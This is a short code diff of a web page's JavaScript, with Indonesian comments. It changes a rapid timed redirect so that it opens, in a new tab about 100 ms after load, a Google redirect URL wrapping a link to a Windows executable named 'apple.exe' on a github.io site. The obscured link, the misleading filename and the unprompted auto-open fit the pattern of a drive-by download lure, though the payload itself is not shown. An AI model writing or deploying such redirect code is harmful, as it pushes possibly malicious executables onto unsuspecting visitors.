@@ -28,8 +28,10 @@ function a() {
     // Step 2: redirect sangat cepat (±100 ms)
     setTimeout(function () {
         console.log("Redirect 1 after", Date.now() - start, "ms");
-        win.location.href =
-            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe', '_blank';
+       window.open(
+  'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe',
+  '_blank'
+);
 
         // Step 3: redirect berikutnya (opsional, 900 ms)
         setTimeout(function () {
@@ -47,4 +49,5 @@ function a() {
 
 </body>
 </html>
+
 
